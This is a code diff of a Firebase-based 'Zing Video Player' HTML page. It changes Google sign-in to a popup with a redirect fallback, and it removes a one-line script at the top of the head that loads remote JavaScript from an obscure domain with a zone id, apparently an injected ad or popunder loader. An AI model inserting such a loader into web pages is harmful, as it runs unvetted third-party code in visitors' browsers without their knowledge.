@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script>(function(s){s.dataset.zone='11090074',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
     <meta charset="UTF-8">
     <title>Zing Video Player</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
@@ -54,12 +53,21 @@
     const db = firebase.database();
     const auth = firebase.auth();
 
-    // Google Login Function
+    // Improved Login logic for Mobile
     function googleLogin() { 
-        auth.signInWithRedirect(new firebase.auth.GoogleAuthProvider()); 
+        const provider = new firebase.auth.GoogleAuthProvider();
+        auth.signInWithPopup(provider).catch(error => {
+            if (error.code === 'auth/popup-blocked' || error.code === 'auth/popup-closed-by-user') {
+                auth.signInWithRedirect(provider);
+            } else {
+                alert("Login Error: " + error.message);
+            }
+        });
     }
 
-    // Auth state check
+    // Handle Redirect Result
+    auth.getRedirectResult().catch(error => { console.log(error); });
+
     auth.onAuthStateChanged(user => {
         const loginGate = document.getElementById('loginGate');
         const playerSection = document.getElementById('playerSection');
